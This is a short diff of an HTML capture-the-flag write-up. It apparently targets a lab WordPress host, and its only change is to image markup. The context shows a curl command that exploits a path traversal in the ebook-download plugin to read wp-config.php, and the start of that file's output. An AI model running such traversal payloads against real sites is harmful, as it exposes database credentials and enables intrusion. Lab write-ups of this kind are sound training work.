@@ -186,8 +186,7 @@ Interesting Finding(s):
 [+] Data Received: 556.681 KB
 [+] Memory used: 285.543 MB
 [+] Elapsed time: 00:02:18
-</code></pre><ul><li>I was stuck for a moment then I saw post in the forum to check <code>http://10.10.11.125/wp-content/plugins/</code></li></ul><p><img src=./images/2.png alt>
-<img src=./images/3.png alt></p><h2 id=footholduser>Foothold/User</h2><ul><li>We can confirm that <code>ebook</code> plugin is vulnerable<ul><li><a href=https://www.exploit-db.com/exploits/39575 target=_blank rel=noopener>https://www.exploit-db.com/exploits/39575</a></li></ul></li></ul><pre tabindex=0><code>└─$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php                                                                                                   
+</code></pre><ul><li>I was stuck for a moment then I saw post in the forum to check <code>http://10.10.11.125/wp-content/plugins/</code></li></ul><p><img src=./images/2.png alt></p><p><img src=./images/3.png alt></p><h2 id=footholduser>Foothold/User</h2><ul><li>We can confirm that <code>ebook</code> plugin is vulnerable<ul><li><a href=https://www.exploit-db.com/exploits/39575 target=_blank rel=noopener>https://www.exploit-db.com/exploits/39575</a></li></ul></li></ul><pre tabindex=0><code>└─$ curl -s http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php                                                                                                   
 ../../../wp-config.php../../../wp-config.php../../../wp-config.php&lt;?php
 /**
  * The base configuration for WordPress
